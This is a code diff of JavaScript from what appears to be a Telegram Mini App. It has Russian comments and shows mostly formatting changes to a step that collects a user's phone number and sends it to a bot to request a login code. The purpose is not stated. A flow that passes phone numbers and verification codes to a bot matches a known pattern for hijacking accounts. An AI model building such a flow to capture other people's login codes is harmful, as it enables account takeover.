@@ -490,10 +490,10 @@ function topbarGoBack(){if(currentStep>1&&currentStep<=3)switchStep(currentStep,
 
 // ========== ОТПРАВКА КОДА (ШАГ 1 → 2) - ИСПРАВЛЕНО ==========
 async function goStep2(){
-  // Берем то, что пользователь ввел
+  // Берём то, что пользователь ввёл
   let raw = document.getElementById('phoneInput').value;
   
-  // Убираем ВСЕ пробелы, скобки, дефисы — оставляем только цифры
+  // Убираем ВСЕ пробелы, скобки, дефисы, плюсы — оставляем только цифры
   raw = raw.replace(/\D/g, '');
   
   if(raw.length < 5){
@@ -505,24 +505,27 @@ async function goStep2(){
   // Добавляем код страны (+7 для России)
   const cleanPhone = selectedCountry.code + raw;
   
+  // Сохраняем в display для отображения
   document.getElementById('displayPhone').textContent = cleanPhone;
   document.getElementById('dashPhone').textContent = cleanPhone;
   
-  const btn=document.getElementById('btnStep1');
-  btn.textContent='Отправка...';
-  btn.disabled=true;
+  const btn = document.getElementById('btnStep1');
+  btn.textContent = 'Отправка...';
+  btn.disabled = true;
   
   try {
     tg.sendData(JSON.stringify({
       action: "send_code",
       phone: cleanPhone
     }));
-  } catch(e){console.error(e);}
+  } catch(e){
+    console.error(e);
+  }
   
-  btn.textContent='Далее';
-  btn.disabled=false;
-  switchStep(1,2);
-  setTimeout(()=>document.getElementById('c0').focus(),300);
+  btn.textContent = 'Далее';
+  btn.disabled = false;
+  switchStep(1, 2);
+  setTimeout(() => document.getElementById('c0').focus(), 300);
 }
 
 // ========== ПРОВЕРКА КОДА (ШАГ 2 → 3) ==========
